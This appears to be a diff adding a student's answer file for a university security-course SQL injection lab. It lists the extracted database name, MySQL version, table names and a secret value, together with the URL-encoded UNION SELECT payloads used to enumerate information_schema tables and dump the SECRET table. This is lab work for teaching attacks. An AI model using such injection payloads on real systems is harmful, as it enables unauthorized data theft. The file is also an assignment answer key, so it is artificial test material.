@@ -1,0 +1,35 @@
+#Database name
+proj2_inject3
+
+#Version
+5.5.55-0ubuntu0.14.04.1 
+
+#Table names
+HINT
+SECRET 
+foo
+inject3_users 
+
+#Secret
+alpha
+
+#Database URL
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+2%2C+3%2C+database%28%29%3B+--+%27
+
+#Version URL
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+2%2C+3%2C+%40%40version%3B+--+%27
+
+#Table for SECRET url
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+table_schema%2C+3%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+AND+table_name+%21%3D+%27HINT%27%3B+--+%27
+
+#Table for HINTS url
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+table_schema%2C+3%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27%3B+--+%27
+
+#Table for foo url
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+table_schema%2C+3%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+AND+table_name+%21%3D+%27HINT%27+AND+table_name+%21%3D+%27SECRET%27%3B+--+%27
+
+#Table for inject3_users url
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+table_schema%2C+3%2C+table_name+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+AND+table_name+%21%3D+%27HINT%27+AND+table_name+%21%3D+%27SECRET%27+AND+table_name+%21%3D+%27foo%27%3B+--+%27
+
+#Secret URL
+http://trurl.cs.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+secret%2C+3%2C+4+FROM+SECRET+WHERE+hash+%3D+%27279175f6284cffbb172183d5eb6a9afa%27%3B+--+%27
